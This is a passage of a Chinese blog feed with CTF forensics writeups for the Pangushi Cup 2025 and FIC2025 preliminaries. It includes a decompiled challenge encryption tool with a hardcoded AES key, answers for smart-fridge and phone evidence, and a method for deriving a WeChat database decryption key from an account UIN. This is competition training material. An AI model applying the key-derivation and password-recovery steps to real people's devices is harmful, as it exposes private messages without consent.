class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: encrypt_deobfuscated.pyc</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.8.0rc1+ (3413)</span></span><br><span class="line"><span class="comment"># Source timestamp: 2025-04-17 01:58:27 UTC (1744855107)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> filedialog, messagebox</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptionTool</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self._generate_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate_key</span>(<span class="params">self</span>):</span><br><span class="line">        seed_values = [(<span class="number">19</span>, <span class="number">7</span>, <span class="number">83</span>), (<span class="number">5</span>, <span class="number">31</span>, <span class="number">69</span>), (<span class="number">13</span>, <span class="number">11</span>, <span class="number">86</span>), (<span class="number">41</span>, <span class="number">3</span>, <span class="number">76</span>), (<span class="number">2</span>, <span class="number">57</span>, <span class="number">55</span>), (<span class="number">23</span>, <span class="number">5</span>, <span class="number">96</span>), (<span class="number">17</span>, <span class="number">13</span>, <span class="number">58</span>), (<span class="number">29</span>, <span class="number">7</span>, <span class="number">94</span>), (<span class="number">11</span>, <span class="number">19</span>, <span class="number">102</span>), (<span class="number">7</span>, <span class="number">17</span>, <span class="number">42</span>), (<span class="number">43</span>, <span class="number">3</span>, <span class="number">48</span>), (<span class="number">37</span>, <span class="number">11</span>, <span class="number">51</span>), (<span class="number">3</span>, <span class="number">43</span>, <span class="number">52</span>), (<span class="number">59</span>, <span class="number">7</span>, <span class="number">53</span>), (<span class="number">47</span>, <span class="number">5</span>, <span class="number">54</span>)]</span><br><span class="line">        key_parts = []</span><br><span class="line">        <span class="keyword">for</span> a, b, base <span class="keyword">in</span> seed_values:</span><br><span class="line">            val = (a * b % <span class="number">60</span> + base) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">if</span> val % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                val = (val + <span class="number">13</span>) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                val = (val + <span class="number">7</span>) % <span class="number">256</span></span><br><span class="line">            key_parts.append(<span class="built_in">chr</span>(val))</span><br><span class="line">        scrambled = []</span><br><span class="line">        indices = [<span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> indices:</span><br><span class="line">            scrambled.append(key_parts[idx])</span><br><span class="line">        raw_key = <span class="string">&#x27;&#x27;</span>.join(scrambled)</span><br><span class="line">        timestamp = <span class="built_in">int</span>(time.time()) % <span class="number">1000</span></span><br><span class="line">        random_val = random.randint(<span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">        entropy = <span class="built_in">chr</span>(timestamp % <span class="number">256</span>) + <span class="built_in">chr</span>(random_val)</span><br><span class="line">        temp_key = hashlib.sha256((raw_key + entropy).encode()).digest()</span><br><span class="line">        self._descramble_key(temp_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_descramble_key</span>(<span class="params">self, temp_key</span>):</span><br><span class="line">        mixed_base = <span class="string">b&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>([b ^ <span class="number">42</span>]) <span class="keyword">for</span> b <span class="keyword">in</span> temp_key[:<span class="number">10</span>]])</span><br><span class="line">        actual_key = <span class="string">&#x27;SecureKey123456&#x27;</span></span><br><span class="line">        self.enhanced_key = self.enhance_key(actual_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enhance_key</span>(<span class="params">self, key</span>):</span><br><span class="line">        round1 = self._add_salt(key)</span><br><span class="line">        round2 = self._ascii_transform(round1)</span><br><span class="line">        round3 = self._xor_transform(round2)</span><br><span class="line">        round4 = round3[::-<span class="number">1</span>]</span><br><span class="line">        final_key = hashlib.md5(round4.encode()).digest()</span><br><span class="line">        <span class="keyword">return</span> final_key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_add_salt</span>(<span class="params">self, key</span>):</span><br><span class="line">        salt_components = [<span class="string">&#x27;salt&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> key + <span class="string">&#x27;&#x27;</span>.join(salt_components)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_ascii_transform</span>(<span class="params">self, text</span>):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">            ascii_val = <span class="built_in">ord</span>(text[i])</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>((ascii_val + <span class="number">7</span>) % <span class="number">256</span>)</span><br><span class="line">            <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>((ascii_val ^ <span class="number">15</span>) % <span class="number">256</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(ascii_val * <span class="number">5</span> % <span class="number">256</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xor_transform</span>(<span class="params">self, text</span>):</span><br><span class="line">        xor_keys = [<span class="string">&#x27;XorKey123456789&#x27;</span>, <span class="string">&#x27;AnotherKey987654&#x27;</span>]</span><br><span class="line">        result = text</span><br><span class="line">        <span class="keyword">for</span> xor_key <span class="keyword">in</span> xor_keys:</span><br><span class="line">            temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">                temp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(result[i]) ^ <span class="built_in">ord</span>(xor_key[i % <span class="built_in">len</span>(xor_key)]))</span><br><span class="line">            result = temp</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad_data</span>(<span class="params">self, data</span>):</span><br><span class="line">        block_size = AES.block_size</span><br><span class="line">        padding_length = block_size - <span class="built_in">len</span>(data) % block_size</span><br><span class="line">        padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">        <span class="keyword">return</span> data + padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad_data</span>(<span class="params">self, data</span>):</span><br><span class="line">        padding_length = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> data[:-padding_length]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">self, input_file, output_file=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> output_file:</span><br><span class="line">            output_file = input_file + <span class="string">&#x27;.enc&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cipher = AES.new(self.enhanced_key, AES.MODE_CBC)</span><br><span class="line">            iv = cipher.iv</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                file_data = f.read()</span><br><span class="line">            padded_data = self.pad_data(file_data)</span><br><span class="line">            encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(iv + encrypted_data)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, output_file)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptionGUI</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, root</span>):</span><br><span class="line">        self.root = root</span><br><span class="line">        self.root.title(<span class="string">&#x27;File Encryption Tool&#x27;</span>)</span><br><span class="line">        self.root.geometry(<span class="string">&#x27;500x300&#x27;</span>)</span><br><span class="line">        self.root.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        self.encryptor = EncryptionTool()</span><br><span class="line">        self.setup_ui()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setup_ui</span>(<span class="params">self</span>):</span><br><span class="line">        file_frame = tk.Frame(self.root, pady=<span class="number">20</span>)</span><br><span class="line">        file_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        tk.Label(file_frame, text=<span class="string">&#x27;Select File to Encrypt:&#x27;</span>).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line">        self.file_path = tk.StringVar()</span><br><span class="line">        tk.Entry(file_frame, textvariable=self.file_path, width=<span class="number">30</span>).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line">        tk.Button(file_frame, text=<span class="string">&#x27;Browse&#x27;</span>, command=self.browse_file).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line">        action_frame = tk.Frame(self.root, pady=<span class="number">20</span>)</span><br><span class="line">        action_frame.pack()</span><br><span class="line">        tk.Button(action_frame, text=<span class="string">&#x27;Encrypt File&#x27;</span>, command=self.encrypt_file, bg=<span class="string">&#x27;#4CAF50&#x27;</span>, fg=<span class="string">&#x27;white&#x27;</span>, width=<span class="number">15</span>, height=<span class="number">2</span>).pack(pady=<span class="number">10</span>)</span><br><span class="line">        status_frame = tk.Frame(self.root, pady=<span class="number">10</span>)</span><br><span class="line">        status_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        self.status_var = tk.StringVar()</span><br><span class="line">        self.status_var.<span class="built_in">set</span>(<span class="string">&#x27;Ready&#x27;</span>)</span><br><span class="line">        tk.Label(status_frame, textvariable=self.status_var, bd=<span class="number">1</span>, relief=tk.SUNKEN, anchor=tk.W).pack(fill=<span class="string">&#x27;x&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">browse_file</span>(<span class="params">self</span>):</span><br><span class="line">        filename = filedialog.askopenfilename(title=<span class="string">&#x27;Select File to Encrypt&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            self.file_path.<span class="built_in">set</span>(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">self</span>):</span><br><span class="line">        file_path = self.file_path.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_path:</span><br><span class="line">            messagebox.showerror(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;Please select a file first!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.status_var.<span class="built_in">set</span>(<span class="string">&#x27;Encrypting...&#x27;</span>)</span><br><span class="line">        self.root.update()</span><br><span class="line">        success, result = self.encryptor.encrypt_file(file_path)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            self.status_var.<span class="built_in">set</span>(<span class="string">f&#x27;Encryption complete! Output: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">            messagebox.showinfo(<span class="string">&#x27;Success&#x27;</span>, <span class="string">f&#x27;File encrypted successfully!\nOutput: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.status_var.<span class="built_in">set</span>(<span class="string">f&#x27;Encryption failed: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&#x27;Error&#x27;</span>, <span class="string">f&#x27;Encryption failed: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    app = EncryptionGUI(root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>42</p><h3 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h3><p><strong>分析文件头部元素并确定它们的正确顺序。将字段名称按顺序连接并提交？</strong></p><p>由上题得</p><p>iv_encrypted_key</p><h3 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h3><p><strong>密钥派生过程中使用了几个算法步骤。其中一个函数使用了与其实际功能不符的名称。找出这个函数名并提交？</strong></p><p>mixed_base变量并未用到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747410712815-eb2bcadb-f71a-4ec1-a603-f5618272a9bb.png" alt="img"></p><p>_descramble_key</p><h2 id="物联网取证"><a href="#物联网取证" class="headerlink" title="物联网取证"></a>物联网取证</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h3><p><strong>分析冰箱，请问智能冰箱的品牌？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747412077483-08b957c7-1acc-462a-8994-2be88fc6b93e.png" alt="img"></p><p>Panasonic</p><h3 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h3><p><strong>请问智能冰箱的型号？</strong></p><p>由上题</p><p>NR-E46CV1</p><h3 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h3><p><strong>请找智能冰箱的uuid？</strong></p><p>大概就是上面第三行的东西吧</p><p>12345678-90AB-CDEF-1234-567890ABCDEF</p><h3 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h3><p><strong>请问智能冰箱默认保存几张图片？</strong></p><p>可以发现每个保存图片的区域前都有一个face，搜索一下</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747412711034-d319e9e4-2e2d-482b-8e0d-b5100093209b.png" alt="img"></p><p>5</p><h3 id="5-4"><a href="#5-4" class="headerlink" title="5"></a>5</h3><p><strong>请问冰箱中已存的第一张图片上的内容是什么？</strong></p><p>将第一张图片提取出来</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747412891488-ec73925a-7ce9-4e52-9465-eb329fe52416.jpeg" alt="img"></p><p>盘古石杯贾韦码</p><h3 id="6-3"><a href="#6-3" class="headerlink" title="6"></a>6</h3><p><strong>请问冰箱中已存的第二张图片的名称是什么？</strong></p><p>由于在前面的题中知道了上题的图片叫face1.jpg，因此可得</p><p>face2.jpg</p><h3 id="7-3"><a href="#7-3" class="headerlink" title="7"></a>7</h3><p><strong>请找冰箱中隐藏的内容？</strong></p><p>用一个strings命令即可查看到特殊字符串</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747414973424-27323abc-5751-422d-a0dd-7bf00cbf603b.png" alt="img"></p><p>pangushicup</p><h3 id="8-3"><a href="#8-3" class="headerlink" title="8"></a>8</h3><p><strong>请找出冰箱中嫌疑人图片MD5值的后六位？</strong></p><p>根据案情知嫌疑人是钟无声，因此是这张照片</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747415152415-5bcba515-93af-40e2-b6b2-3c3d1ae10120.jpeg" alt="img"></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747415215804-11c1139d-3c09-4561-be13-74f04c2cf30e.png" alt="img"></p><p>882564</p><h3 id="9-3"><a href="#9-3" class="headerlink" title="9"></a>9</h3><p><strong>请找出冰箱最后一次开门时间？</strong></p><p>之前提取出来的enc文件中face1.jpg的修改时间即为冰箱最后一次开门时间。</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747415448819-6d511de8-43f0-45fc-8e89-1460e2d5aaa6.png" alt="img"></p><p>15:48</p><h3 id="10-2"><a href="#10-2" class="headerlink" title="10"></a>10</h3><p><strong>默认图片的存储限制大小是多少？</strong></p><p>查看前面第二题中face与face之间的间隔具体，即可知道存储限制大小</p><p>100KB</p><h3 id="11-2"><a href="#11-2" class="headerlink" title="11"></a>11</h3><p><strong>分析video.E01，被修改的录像md5前5位是？</strong></p><p>可以发现存在问题的是20250415文件夹中的233549-00001-M.mp4，录像被往回跳了几秒。</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747416177214-a0c28a47-274c-4840-b548-495c1e659c15.png" alt="img"></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747416260123-9b5cd922-f652-4f3a-96c2-b0aa098d73c4.png" alt="img"></p><p>ea7be</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Forensics </tag>
            
            <tag> 盘古石杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2025 Writeup</title>
      <link href="/posts/dde87c/"/>
      <url>/posts/dde87c/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我们至今仍未知道ISCC主办方的心理，可以说是打过最烂的比赛了，没有之一</p><p>虽说有的史很难吃，但是有的题对于本菜狗来说还是能学到点东西的（</p></blockquote><h4 id="校赛Writeup"><a href="#校赛Writeup" class="headerlink" title="校赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/ISCC2025Writeup1.pdf">校赛Writeup</a></h4><h4 id="区域赛Writeup"><a href="#区域赛Writeup" class="headerlink" title="区域赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/ISCC2025Writeup2.pdf">区域赛Writeup</a></h4><h4 id="决赛Writeup"><a href="#决赛Writeup" class="headerlink" title="决赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/ISCC2025Writeup3.pdf">决赛Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FIC2025初赛 writeup+复现</title>
      <link href="/posts/24543801/"/>
      <url>/posts/24543801/</url>
      
        <content type="html"><![CDATA[<blockquote><p>混了个三等奖，三人赛有一人因为设备问题挂机了，两个人打有点吃力，不然也许能更好()</p><p>还是我太菜了(T0T)。</p><p>网页快照部分当时不是我看的，也完全没看，看起来也没什么意思，这里就不写wp和复现了。</p></blockquote><h2 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，并回答该手机的device_name是？</strong></p><p>找settings_global.xml就行</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745841246627-498499e0-093f-49c7-b27c-4a85f36e280f.png" alt="img"></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745841273226-f28c711e-f2fd-4509-8bb0-98a567494e98.png" alt="img"></p><p>Redmi 6 Pro</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人pc开机密码是什么？</strong></p><p>翻一下备忘录的数据库<code>检材2.tar/data/com.bijoysingh.yang/databases</code>可以找到</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745845363223-298da38f-31b7-47fe-89a8-6973672a0c92.png" alt="img"></p><p>1qaz2wsx</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人接头暗号是什么？</strong><br> 从上一题可以看出接头暗号是一张图片，在备忘录的文件中找到这张图片</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745845570412-ec63ce93-c2c3-4b92-9426-16c771be52ca.png" alt="img"></p><p>爱能不能够永远单纯没有悲哀</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人存放的秘钥环是多少？</strong><br>已经可以直接看到是在便签里，但没有直接显示出来</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745845941336-95e33dc0-97ab-4513-88bc-50fdaf9b4673.png" alt="img"></p><p>去便签的数据库检材2.tar&#x2F;data&#x2F;com.miui.notes&#x2F;databases里面找一找</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745845997189-adae0af3-6e31-486b-ab8b-60ec62b9aeca.png" alt="img"></p><p>1qaz2wsx3edc</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人一生中最重要的日子是什么时候？</strong></p><p>手机中有一张截图</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745846603877-31fa08ce-9ae4-409c-978f-9bbec0da382c.png" alt="img"></p><p>由此可算出是2026-02-06</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><strong>请分析检材三，请分析”手机”检材，并回答，嫌疑人微信生成的聊天记录数据库文件名称是什么？</strong></p><p>最近在做微信取证相关的项目，这题直接秒了</p><p>EnMicroMsg.db</p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人微信账号对应的 UIN 为多少？</strong><br>可以直接读到uin</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745850601417-aa7f00c3-0ed6-4cd1-9745-f22d5a89f29f.png" alt="img"></p><p>1864810197</p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人微信聊天记录数据库的加密秘钥是什么？</strong></p><p>在uin前面加上1234567890ABCEDF再取md5值前7位就是密钥</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745850740075-4098228c-5fa6-4f61-b9ea-c263eca5dd25.png" alt="img"></p><p>31ad809</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人“欠条.rar”的解压密码是多少？</strong></p><p>密码是好友TCGG的手机号</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745850904818-1e9790e1-cdeb-49e1-9416-8221e317d637.png" alt="img"></p><p>手机号前面的聊天记录里有提到，看起来是个图片隐写</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745851161179-c6776cbf-d469-4f15-af0d-6e87dbc5a7d5.png" alt="img"></p><p>找到一张带有二维码的图片</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745851204088-3f269019-5a13-4ddd-bdd2-84ef3d936fa5.png" alt="img"></p><p>稍微处理一下扫出来就是手机号</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745851258365-431be507-7367-40df-852c-e8ba43e68fb8.png" alt="img"></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745851333110-ed4ef711-ac64-4ce9-9e01-a479f9779fcb.png" alt="img"></p><p>3170010703</p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人“欠条.rar”解压后，其中VeraCrypt容器的MD5值是多少？</strong></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745851434877-66fe304d-9fe1-4236-b597-9295c4f136a6.png" alt="img"></p><p>83da62aabc88cb1b23e9469142b67b80</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人提供的“欠条.rar”解压后，其中”1.png”图上显示的VeraCrypt容器密码是多少？</strong></p><p>异或一下能看得更清楚</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745851708260-1d8b8c50-f412-4252-948f-48f78f4a2e7c.png" alt="img"></p><p>#!@KE2sax@!da0h5hghg34&amp;@</p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人李某全名是什么？</strong></p><p>挂载一下欠条</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745851949069-88aa9d9e-c438-42c2-8b40-791038c4860d.png" alt="img"></p><p>李安弘</p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p><strong>请分析检材二，请分析”手机”检材，并回答，嫌疑人欠款金额是多少？</strong></p><p>由欠条可得</p><p>80000</p><h2 id="介质取证"><a href="#介质取证" class="headerlink" title="介质取证"></a>介质取证</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，该电脑最后一次开机时间是？</strong></p><p><strong>A. 2025&#x2F;4&#x2F;15 16:21:41</strong></p><p><strong>B. 2025&#x2F;4&#x2F;14 11:48:47</strong></p><p><strong>C. 2025&#x2F;4&#x2F;14 11:49:47</strong></p><p><strong>D. 2025&#x2F;4&#x2F;14 11:46:47</strong></p><p>可以看出应该是2025&#x2F;4&#x2F;14 11:49:47</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745853935266-6afa0bb3-c343-4e4e-bd30-159be14599fe.png" alt="img"></p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，嫌疑人的备用机号码是多少？</strong><br>备用机号可以在便签里面找到，一段白色的文字</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745855742316-36fd9370-fdbc-401d-99f4-4dbd462701f1.png" alt="img"></p><p>18877332134</p><h3 id="3-1"><a href="#3-1" 